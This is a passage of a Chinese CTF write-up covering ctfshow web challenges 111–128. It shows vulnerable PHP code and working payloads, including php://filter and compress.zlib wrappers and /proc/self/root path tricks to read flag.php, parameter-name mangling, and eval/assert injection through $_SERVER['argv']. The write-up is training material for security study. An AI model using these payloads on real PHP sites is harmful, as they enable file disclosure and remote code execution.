?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>过滤后仅有输出这些字符不触发die函数ABCDEFGHIJKLMNOPQRSTUVWXYZ]abcdefghijklmnopqrstuvwxyz|}</p>
</blockquote>
<p>且v1还需要有<strong>ctfshow</strong>，不过本题没有再用到eval函数，而是用到了getFlag函数</p>
<pre class="line-numbers language-none"><code class="language-none">function getFlag(&amp;$v1,&amp;$v2)&#123;
  eval(&quot;$$v1 &#x3D; &amp;$$v2;&quot;);
  var_dump($$v1);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>一个&#x3D;说明是赋值，所以原先得到的是$ctfshow&#x3D;$GLOBALS,即$$v1&#x3D;$GLOBALS，所以最终var_dump输出的就是**var_dump($GLOBALS)**；以此获取全局变量得到flag。</p>
<pre class="line-numbers language-none"><code class="language-none">?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211212422.png"></p>
<h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
function filter($file)&#123;
  if(preg_match(&#39;&#x2F;\.\.\&#x2F;|http|https|data|input|rot13|base64|string&#x2F;i&#39;,$file))&#123;
    die(&quot;hacker!&quot;);
  &#125;else&#123;
    return $file;
  &#125;
&#125;
$file&#x3D;$_GET[&#39;file&#39;];
if(! is_file($file))&#123;
  highlight_file(filter($file));
&#125;else&#123;
  echo &quot;hacker!&quot;;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先看下面的判断，通过is_file函数判断file是否为常规文件，如果不是就触发filter函数，而在filter函数中对rot13、base64等进行过滤，如果含有就触发die函数，那么从filter过滤的字符来看，本题应该要用到伪协议来读取从而拿到flag文件，没给提示多半存在flag.php文件中</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">所以我们可以构造
file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php   &#x2F;&#x2F;直接读取
其他
file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php 
file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.*&#x2F;resource&#x3D;flag.php
file&#x3D;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate|zlib.inflate&#x2F;resource&#x3D;flag.php  &#x2F;&#x2F;压缩与解压缩
具体还有其他方式我没实验，可以看该大佬汇总https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_44657899&#x2F;article&#x2F;details&#x2F;109300335<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211625178.png"></p>
<pre class="line-numbers language-none"><code class="language-none">参考
is_file() 函数检查指定的文件是否是常规的文件。
-----------------------语法---------------------------------------
is_file(file)
参数	描述
file	必需。规定要检查的文件。

quoted_printable_encode() 函数把 8 位字符串转换为 quoted-printable 字符串。
-----------------------语法---------------------------------------
quoted_printable_encode(string)
参数	描述
string	必需。规定要转换的 8 位字符串。

convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; 
&lt;input-encoding&gt;和&lt;output-encoding&gt; 就是编码方式，有如下几种;
UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
如果input和output都给参，那么意思就是从input形式转换为output形式。
大佬链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_44657899&#x2F;article&#x2F;details&#x2F;109300335<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
function filter($file)&#123;
  if(preg_match(&#39;&#x2F;filter|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;
    die(&#39;hacker!&#39;);
  &#125;else&#123;
    return $file;
  &#125;
&#125;
$file&#x3D;$_GET[&#39;file&#39;];
if(! is_file($file))&#123;
  highlight_file(filter($file));
&#125;else&#123;
  echo &quot;hacker!&quot;;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>跟上题差不多，不过把input去掉了，但也把filter方式给过滤了，开始我想着通过php:&#x2F;&#x2F;input的方式输出php代码获取，但是结果确实将代码直接输出在源码下方</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211648515.png"></p>
<p>看佬wp得知，有两种方式来解决</p>
<p>第一种可以通过读取压缩流从而获得flag</p>
<pre class="line-numbers language-none"><code class="language-none">file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211649243.png"></p>
<p>第二种则是利用到linux里<code>/proc/self/root</code>是指向根目录的，如果对其ls，则代表访问根目录。因此多次重复 <code>/proc/self/root</code>，导致路径深入到 <code>/var/www/html/flag.php</code>，并从而绕过了常规文件检查。</p>
<pre class="line-numbers language-none"><code class="language-none">从而构造造
file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211651862.png"></p>
<h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
function filter($file)&#123;
  if(preg_match(&#39;&#x2F;compress|root|zip|convert|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;
    die(&#39;hacker!&#39;);
  &#125;else&#123;
    return $file;
  &#125;
&#125;
$file&#x3D;$_GET[&#39;file&#39;];
echo &quot;师傅们居然tql都是非预期 哼！&quot;;
if(! is_file($file))&#123;
  highlight_file(filter($file));
&#125;else&#123;
  echo &quot;hacker!&quot;;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>原滋原味，不过过滤了更多字符，通过对compress、zip、root的过滤，我们php113的方法已经全部失效了，covert方法使得filter大部分方法也无法奏效，</p>
<p>不过我们可以像php112一样，直接filter读取该文件，从而得到flag</p>
<pre class="line-numbers language-none"><code class="language-none">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php
其他
file&#x3D;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate|zlib.inflate&#x2F;resource&#x3D;flag.php  &#x2F;&#x2F;压缩和解压缩<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211753801.png"></p>
<h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
include(&#39;flag.php&#39;);
highlight_file(__FILE__);
error_reporting(0);
function filter($num)&#123;
  $num&#x3D;str_replace(&quot;0x&quot;,&quot;1&quot;,$num);
  $num&#x3D;str_replace(&quot;0&quot;,&quot;1&quot;,$num);
  $num&#x3D;str_replace(&quot;.&quot;,&quot;1&quot;,$num);
  $num&#x3D;str_replace(&quot;e&quot;,&quot;1&quot;,$num);
  $num&#x3D;str_replace(&quot;+&quot;,&quot;1&quot;,$num);
  return $num;
&#125;
$num&#x3D;$_GET[&#39;num&#39;];
if(is_numeric($num) and $num!&#x3D;&#x3D;&#39;36&#39; and trim($num)!&#x3D;&#x3D;&#39;36&#39; and filter($num)&#x3D;&#x3D;&#39;36&#39;)&#123;
  if($num&#x3D;&#x3D;&#39;36&#39;)&#123;
    echo $flag;
  &#125;else&#123;
    echo &quot;hacker!!&quot;;
  &#125;
&#125;else&#123;
  echo &quot;hacker!!!&quot;;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过上面源码可以看到，其将num进行了多次检查，先检查该<code>$num</code>是否为一个数字，然后检查 <code>$num</code> 是否不等于字符串 “36”。随后通过trim函数检查去除首尾空格后的 <code>$num</code> 是否不等于字符串 “36”。最后调用 <code>filter()</code> 函数对 <code>$num</code> 进行一系列替换后，检查是否等于字符串 “36”。                                                                                                     而在filter函数中，将字符串中的 “0x” 、”0”、 “.”、”e”、”+” 替换为 “1”。</p>
<pre class="line-numbers language-none"><code class="language-none">trim() 函数移除字符串两侧的空白字符或其他预定义字符。
--------------------------语法----------------------------------
trim(string,charlist)
参数	描述
string	必需。规定要检查的字符串。
charlist	可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：
&quot;\0&quot; - NULL
&quot;\t&quot; - 制表符
&quot;\n&quot; - 换行
&quot;\x0B&quot; - 垂直制表符
&quot;\r&quot; - 回车
&quot; &quot; - 空格<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>网上佬的过滤脚本</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
for ($i &#x3D; 0; $i &lt; 129; $i++) &#123;
    $char &#x3D; chr($i);
    $num &#x3D; $char . &#39;36&#39;;

    &#x2F;&#x2F; Check conditions
    if(trim($num) !&#x3D;&#x3D; &#39;36&#39; &amp;&amp; is_numeric($num) &amp;&amp; $num !&#x3D;&#x3D; &#39;36&#39;)&#123;
        echo urlencode($char) . &quot; &quot;;
    &#125;
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211819162.png"></p>
<pre class="line-numbers language-none"><code class="language-none">构造GET： num&#x3D;%0C36    &#x2F;&#x2F;%0c &#x3D; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211820697.png"></p>
<h3 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
$a&#x3D;$_SERVER[&#39;argv&#39;];
$c&#x3D;$_POST[&#39;fun&#39;];
if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;
  if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?&#x2F;&quot;, $c)&amp;&amp;$c&lt;&#x3D;18)&#123;
     eval(&quot;$c&quot;.&quot;;&quot;); 
     if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;
       echo $flag;
     &#125;
  &#125;
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看看这个过滤，也就是说如果$c含有以下字符和c&lt;&#x3D;18触发这个eval函数，</p>
<blockquote>
<p>$&amp;():&lt;&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZ[]_abcdefghijklmnopqrstuvwxyz|</p>
</blockquote>
<p>在POST传参中，如果参数名中含有<code>空格</code>和<code>点</code>，传入的参数名中点<code>.</code>和<code>空格</code>都被替换为了下划线<code>_</code>，这样的参数名确实无法传参，所以我们需要利用到<code>[</code>这个特性。                                                                                                          当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p>
<p>可以参考该大佬博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/115050295">谈一谈PHP中关于非法参数名传参问题_arr4y非法传参-CSDN博客</a></p>
<blockquote>
<p>PHP 超级全局变量列表:</p>
<ul>
<li>$GLOBALS</li>
<li>$_SERVER</li>
<li>$_REQUEST</li>
<li>$_POST</li>
<li>$_GET</li>
<li>$_FILES</li>
<li>$_ENV</li>
<li>$_COOKIE</li>
<li>$_SESSION</li>
</ul>
</blockquote>
<h4 id="第一种-1"><a href="#第一种-1" class="headerlink" title="第一种"></a>第一种</h4><p>所以我们可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">POST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;2&amp;fun&#x3D;echo $flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401212032664.png"></p>
<h4 id="第二种-1"><a href="#第二种-1" class="headerlink" title="第二种"></a>第二种</h4><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reserved.variables.argv.php">PHP: $argv - Manual</a></p>
<p>利用到argv的性质，从而我们可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">GET: $fl0g&#x3D;flag_give_me
POST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;2&amp;fun&#x3D;eval($a[0])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401212046405.png"></p>
<h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
$a&#x3D;$_SERVER[&#39;argv&#39;];
$c&#x3D;$_POST[&#39;fun&#39;];
if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;
  if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print&#x2F;i&quot;, $c)&amp;&amp;$c&lt;&#x3D;16)&#123;
     eval(&quot;$c&quot;.&quot;;&quot;);
     if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;
       echo $flag;
     &#125;
  &#125;
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>与上题相似，不过其将echo等输出语句也给过滤掉了，其特殊符号也与上题大差不差</p>
<blockquote>
<p>$&amp;():&lt;&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZ[]_abcdefghijklmnopqrstuvwxyz|</p>
</blockquote>
<p>不过还有一个parse_str函数可以使用</p>
<pre class="line-numbers language-none"><code class="language-none">parse_str() 函数把查询字符串解析到变量中。
注释：如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。
注释：php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。
-------------------------语法---------------------------------------
parse_str(string,array)
参数	描述
string	必需。规定要解析的字符串。
array	可选。规定存储变量的数组名称。该参数指示变量存储到数组中。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再结合上题我们也是涉及到了数组，我们可以这样构造</p>
<pre class="line-numbers language-none"><code class="language-none">GET: a&#x3D;1+fl0g&#x3D;flag_give_me
POST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;parse_str($a[1]) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221053570.png"></p>
<p>在我看来 GET 请求的参数部分包含 <code>1+fl0g=flag_give_me</code>，而这样的构造会使整个 PHP 文件无法正常解析。实际上，<code>a=1+fl0g=flag_give_me</code> 应该是两个独立的 GET 参数，而不是一个。所以修改 GET 请求的构造，使其变为：<code>a=1&amp;fl0g=flag_give_me</code>。这样在parse_str函数中就会使得<code>fl0g</code>的值为<code>flag_give_me</code>                             代码为</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
$inputString &#x3D; &quot;1&amp;fl0g&#x3D;flag_give_me&quot;;
$variables &#x3D; array();
parse_str($inputString, $variables);
var_dump($variables);
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221229139.png"></p>
<p><strong>还有一种是看大佬wp的方式</strong></p>
<p><strong>1、cli模式（命令行）下</strong></p>
<pre><code>第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数
</code></pre>
<p><strong>2、web网页模式下</strong></p>
<pre><code>在web页模式下必须在php.ini开启register_argc_argv配置项

设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果

这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]

$argv,$argc在web模式下不适用
</code></pre>
<p>而$_SERVER[‘QUERY_STRING’]会获取查询语句即GET传参?的语句，所以</p>
<pre class="line-numbers language-none"><code class="language-none">?$fl0g&#x3D;flag_give_me    
$a[0]&#x3D;$_SERVER[‘argv’][0]&#x3D;$_SERVER[‘QUERY_STRING’]&#x3D;&gt;$fl0g&#x3D;flag_give_me <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>所以我们可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">GET: $fl0g&#x3D;flag_give_me;
POST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;2&amp;fun&#x3D;eval($a[0])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221239246.png"></p>
<p><strong>官方WP</strong></p>
<pre class="line-numbers language-none"><code class="language-none">GET: 1&#x3D;flag.php
POST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;2&amp;fun&#x3D;highlight_file($_GET[1])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221241502.png"></p>
<pre class="line-numbers language-none"><code class="language-none">highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
$a&#x3D;$_SERVER[&#39;argv&#39;];
$c&#x3D;$_POST[&#39;fun&#39;];
if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;
  if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d&#x2F;i&quot;, $c) &amp;&amp; strlen($c)&lt;&#x3D;16)&#123;
     eval(&quot;$c&quot;.&quot;;&quot;); 
     if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;
       echo $flag;
     &#125;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此题过滤了更多东西，仅能输出以下字符</p>
<blockquote>
<p> $&amp;():&lt;&gt;ABEHJKLMNPQRSTUVWXYZ[]_abehjklmnpqrstuvwxyz|</p>
</blockquote>
<p>上个大佬的wp在本题依然能使用，但官方wp就不行了，构造为</p>
<pre class="line-numbers language-none"><code class="language-none">GET: $fl0g&#x3D;flag_give_me;
POST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;2&amp;fun&#x3D;eval($a[0])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221248399.png"></p>
<p>上个parse_str函数也仍然能够调用，可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">GET: 1+fl0g&#x3D;flag_give_me
POST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;2&amp;fun&#x3D;parse_str($a[1])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221250719.png"></p>
<p>不过本题实际想考查的是assert函数<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert">PHP: assert - Manual</a></p>
<pre class="line-numbers language-none"><code class="language-none">assert(mixed $assertion, Throwable|string|null $description &#x3D; null): bool
assertion
可以是任何带返回值的表达式，运行后的结果用于表示断言成功还是失败。
警告
在 PHP 8.0.0 之前，如果 assertion 是 string，将解释为 PHP 代码，并通过 eval() 执行。这个字符串将作为第三个参数传递给回调函数。这种行为在 PHP 7.2.0 中弃用，并在 PHP 8.0.0 中移除。

description
如果 description 是 Throwable 的实例，只有在 assertion 执行失败时才会抛出。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意<code>在 PHP 8.0.0 之前，如果 assertion 是 string，将解释为 PHP 代码</code></p>
<pre class="line-numbers language-none"><code class="language-none">GET: $fl0g&#x3D;flag_give_me 
POST: CTF_SHOW&#x3D;6&amp;CTF[SHOW.COM&#x3D;6&amp;fun&#x3D;assert($a[0])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
$ctf_show &#x3D; md5($flag);
$url &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];
&#x2F;&#x2F;特殊字符检测
function waf($url)&#123;
  if(preg_match(&#39;&#x2F;\&#96;|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#39;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\&#x2F;&#x2F;&#39;, $url))&#123;
    return true;
  &#125;else&#123;
    return false;
  &#125;
&#125;
if(waf($url))&#123;
  die(&quot;嗯哼？&quot;);
&#125;else&#123;
  extract($_GET);
&#125;
if($ctf_show&#x3D;&#x3D;&#x3D;&#39;ilove36d&#39;)&#123;
  echo $flag;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>上面学的<code>$_SERVER[‘QUERY_STRING’]会获取查询语句即GET传参?的语句</code>。然后在waf函数中会对$url进行过滤</p>
<p>如果含有<code>% &amp;=?ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz|</code>就会返回false</p>
<pre class="line-numbers language-none"><code class="language-none">extract() 函数从数组中将变量导入到当前的符号表。
-----------------------------语法-----------------------------------------
extract(array,extract_rules,prefix)
参数	描述
array	必需。规定要使用的数组。

extract_rules	可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。
可能的值：
EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。
EXTR_SKIP - 如果有冲突，不覆盖已有的变量。
EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。
EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。
EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。
EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。
EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。
EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。

prefix	可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。
该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以我们可以通过<code>$_SERVER[‘QUERY_STRING’]</code>获取?后的查询语句，即可以是最后这个if判断内的语句，即?ctf_show&#x3D;ilove36d。但是在preg_match这个过滤中，如果含有<code>_</code>就会导致返回<code>True</code>，但是返回<code>True</code>就会导致触发die函数，所以我们不能有<code>_</code>。这里可以用到空格绕过（即我们前面所遇到的一个php特性，当传参出现<code>空格</code>或<code>.</code>时会被替换为<code>_</code>,在该题中<code>.</code>被过滤了，但是<code>空格</code>没有，所以我们可以通过空格来使其在传参中转换为<code>ctf_show</code>以此达到目的）所以可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">GET:  ctf show&#x3D;ilove36d
或
GET:  ctf%20show&#x3D;ilove36d    &#x2F;&#x2F;%20是空格的URLENCODE，<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221658038.png"></p>
<h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
$f1 &#x3D; $_GET[&#39;f1&#39;];
$f2 &#x3D; $_GET[&#39;f2&#39;];
if(check($f1))&#123;
  var_dump(call_user_func(call_user_func($f1,$f2)));
&#125;else&#123;
  echo &quot;嗯哼？&quot;;
&#125;
function check($str)&#123;
  return !preg_match(&#39;&#x2F;[0-9]|[a-z]&#x2F;i&#39;, $str);
